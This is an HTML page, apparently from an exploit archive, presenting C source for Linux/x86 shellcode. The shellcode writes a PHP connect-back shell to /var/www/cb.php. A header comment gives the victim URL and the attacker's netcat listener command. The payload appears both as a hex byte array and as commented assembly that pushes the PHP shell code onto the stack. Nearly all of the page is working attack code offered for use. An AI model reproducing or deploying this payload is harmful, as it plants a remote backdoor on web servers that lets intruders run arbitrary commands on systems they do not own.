<html><head><title>Linux/x86 - Write FS PHP Connect Back Utility Shellcode - 508 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#include &lt;stdlib.h&gt;

        /* Grayscale Research: Linux Write FS PHP Connect Back Utility Shellcode
         *
         *      Function:
         *              Opens /var/www/cb.php and writes a php connectback shell to the filesystem.
         *
         *      Shellcode Size: 508 bytes (No Encodings)
         *
         *      PHP Shell Usage:
         *              // victim
         *              http://vulnhost.com/cb.php?host=192.168.1.1?port=777
         *
         *              // attacker
         *              nc -l -p 777
         *
         *      greets: #c-, #hhp, #oldskewl, d-town, sd2600, dc214, everyone else.
	 *      
	 *      
         *      ~roonr
         */


	// shellcode
 	    char sc[] = &quot;\x68\x70\x68\x70\xff\x68\x2f\x63\x62\x2e\x68\x2f\x77\x77\x77\x68&quot;
			 &quot;\x2f\x76\x61\x72\x31\xc0\x89\xe6\x88\x46\x0f\x89\xe3\x31\xc9\xb1&quot;
			 &quot;\x42\x31\xd2\xb2\xff\x31\xc0\xb0\x05\xcd\x80\x31\xdb\x88\xc3\x68&quot;
			 &quot;\x3f\x3e\xff\xff\x68\x3b\x7d\x20\x7d\x68\x24\x72\x29\x29\x68\x6c&quot;
			 &quot;\x65\x6e\x28\x68\x20\x73\x74\x72\x68\x20\x24\x72\x2c\x68\x6f\x63&quot;
			 &quot;\x6b\x2c\x68\x65\x28\x24\x73\x68\x77\x72\x69\x74\x68\x6b\x65\x74&quot;
			 &quot;\x5f\x68\x3b\x73\x6f\x63\x68\x31\x24\x20\x22\x68\x73\x75\x31\x2e&quot;
			 &quot;\x68\x5c\x6e\x63\x62\x68\x2e\x3d\x20\x22\x68\x60\x3b\x24\x72\x68&quot;
			 &quot;\x20\x60\x24\x69\x68\x24\x72\x20\x3d\x68\x30\x29\x29\x7b\x68\x2c&quot;
			 &quot;\x20\x31\x30\x68\x73\x6f\x63\x6b\x68\x61\x64\x28\x24\x68\x74\x5f&quot;
			 &quot;\x72\x65\x68\x6f\x63\x6b\x65\x68\x24\x69\x3d\x73\x68\x69\x6c\x65&quot;
			 &quot;\x28\x68\x29\x3b\x77\x68\x68\x22\x2c\x31\x30\x68\x74\x65\x64\x3a&quot;
			 &quot;\x68\x6e\x6e\x65\x63\x68\x20\x22\x43\x6f\x68\x6f\x63\x6b\x2c\x68&quot;
			 &quot;\x65\x28\x24\x73\x68\x77\x72\x69\x74\x68\x6b\x65\x74\x5f\x68\x3b&quot;
			 &quot;\x73\x6f\x63\x68\x6f\x72\x74\x29\x68\x2c\x20\x24\x70\x68\x72\x65&quot;
			 &quot;\x73\x73\x68\x24\x61\x64\x64\x68\x63\x6b\x2c\x20\x68\x28\x24\x73&quot;
			 &quot;\x6f\x68\x6e\x65\x63\x74\x68\x5f\x63\x6f\x6e\x68\x63\x6b\x65\x74&quot;
			 &quot;\x68\x29\x3b\x73\x6f\x68\x5f\x54\x43\x50\x68\x2c\x53\x4f\x4c\x68&quot;
			 &quot;\x52\x45\x41\x4d\x68\x4b\x5f\x53\x54\x68\x2c\x53\x4f\x43\x68\x49&quot;
			 &quot;\x4e\x45\x54\x68\x28\x41\x46\x5f\x68\x65\x61\x74\x65\x68\x74\x5f&quot;
			 &quot;\x63\x72\x68\x6f\x63\x6b\x65\x68\x63\x6b\x3d\x73\x68\x3b\x24\x73&quot;
			 &quot;\x6f\x68\x72\x74\x27\x5d\x68\x5b\x27\x70\x6f\x68\x5f\x47\x45\x54&quot;
			 &quot;\x68\x72\x74\x3d\x24\x68\x3b\x24\x70\x6f\x68\x74\x27\x5d\x29\x68&quot;
			 &quot;\x27\x68\x6f\x73\x68\x47\x45\x54\x5b\x68\x65\x28\x24\x5f\x68\x79&quot;
			 &quot;\x6e\x61\x6d\x68\x6f\x73\x74\x62\x68\x67\x65\x74\x68\x68\x65\x73&quot;
			 &quot;\x73\x3d\x68\x61\x64\x64\x72\x68\x73\x65\x7b\x24\x68\x3b\x7d\x65&quot;
			 &quot;\x6c\x68\x34\x2e\x22\x29\x68\x72\x20\x34\x30\x68\x45\x72\x72\x6f&quot;
			 &quot;\x68\x6e\x74\x28\x22\x68\x7b\x70\x72\x69\x68\x74\x27\x5d\x29\x68&quot;
			 &quot;\x27\x70\x6f\x72\x68\x47\x45\x54\x5b\x68\x26\x21\x24\x5f\x68\x74&quot;
			 &quot;\x27\x5d\x26\x68\x27\x68\x6f\x73\x68\x47\x45\x54\x5b\x68\x28\x21&quot;
			 &quot;\x24\x5f\x68\x50\x20\x69\x66\x68\x3c\x3f\x50\x48\x31\xc0\x89\xe6&quot;
			 &quot;\xb0\x04\x89\xe1\x66\xba\x62\x01\xcd\x80&quot;;

	
int main(){
	

	// run shellcode
        asm(&quot;JMP %0;&quot; : &quot;=m&quot; (sc));

	/*
		asm volatile(
		    &quot;cb_shellcode:\n&quot;
		    &quot;push $0xff706870;&quot; 
		    &quot;push $0x2e62632f;&quot; 
		    &quot;push $0x7777772f;&quot; 
		    &quot;push $0x7261762f;&quot;
		    &quot;xor %eax, %eax;&quot; 
		    &quot;mov %esp, %esi;&quot;
		    &quot;movb %al, 0xf(%esi);&quot;
		   
		    // sys_open 
		    &quot;mov %esp, %ebx; &quot;
                    &quot;xor %ecx, %ecx;&quot;
			    &quot;movb $0x42, %cl;&quot;
		    	&quot;xor %edx, %edx;&quot;
			    &quot;movb $0xff, %dl;&quot;
		    	&quot;xor %eax, %eax;&quot;
	 		    &quot;movb $0x05, %al;&quot; 
		    &quot;int $0x80;&quot;
		    
		    // sys_write
		    &quot;xor %ebx, %ebx;&quot;
		    &quot;mov %al, %bl;&quot;
		    
			// php connectback shellcode
			&quot;push $0xffff3e3f; push $0x7d207d3b; push $0x29297224; push $0x286e656c;&quot;
			&quot;push $0x72747320; push $0x2c722420; push $0x2c6b636f; push $0x73242865;&quot;
			&quot;push $0x74697277; push $0x5f74656b; push $0x636f733b; push $0x22202431;&quot;
			&quot;push $0x2e317573; push $0x62636e5c; push $0x22203d2e; push $0x72243b60;&quot;
			&quot;push $0x69246020; push $0x3d207224; push $0x7b292930; push $0x3031202c;&quot;
			&quot;push $0x6b636f73; push $0x24286461; push $0x65725f74; push $0x656b636f;&quot;
			&quot;push $0x733d6924; push $0x28656c69; push $0x68773b29; push $0x30312c22;&quot;
			&quot;push $0x3a646574; push $0x63656e6e; push $0x6f432220; push $0x2c6b636f;&quot;
			&quot;push $0x73242865; push $0x74697277; push $0x5f74656b; push $0x636f733b;&quot;
			&quot;push $0x2974726f; push $0x7024202c; push $0x73736572; push $0x64646124;&quot;
			&quot;push $0x202c6b63; push $0x6f732428; push $0x7463656e; push $0x6e6f635f;&quot;
			&quot;push $0x74656b63; push $0x6f733b29; push $0x5043545f; push $0x4c4f532c;&quot;
			&quot;push $0x4d414552; push $0x54535f4b; push $0x434f532c; push $0x54454e49;&quot;
			&quot;push $0x5f464128; push $0x65746165; push $0x72635f74; push $0x656b636f;&quot;
			&quot;push $0x733d6b63; push $0x6f73243b; push $0x5d277472; push $0x6f70275b;&quot; 
			&quot;push $0x5445475f; push $0x243d7472; push $0x6f70243b; push $0x295d2774;&quot; 
			&quot;push $0x736f6827; push $0x5b544547; push $0x5f242865; push $0x6d616e79;&quot; 
			&quot;push $0x6274736f; push $0x68746567; push $0x3d737365; push $0x72646461;&quot; 
			&quot;push $0x247b6573; push $0x6c657d3b; push $0x29222e34; push $0x30342072;&quot; 
			&quot;push $0x6f727245; push $0x2228746e; push $0x6972707b; push $0x295d2774;&quot; 
			&quot;push $0x726f7027; push $0x5b544547; push $0x5f242126; push $0x265d2774;&quot; 
			&quot;push $0x736f6827; push $0x5b544547; push $0x5f242128; push $0x66692050;&quot;
			&quot;push $0x48503f3c;&quot;
			
		   &quot;xor %eax, %eax;&quot;
	    	   &quot;mov %esp, %esi;&quot;	    
		   &quot;movb $0x04, %al;&quot;
		   &quot;mov %esp, %ecx;&quot; 
		   &quot;mov $0x162, %dx;&quot; 
		   &quot;int $0x80;&quot;);

	*/
		
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
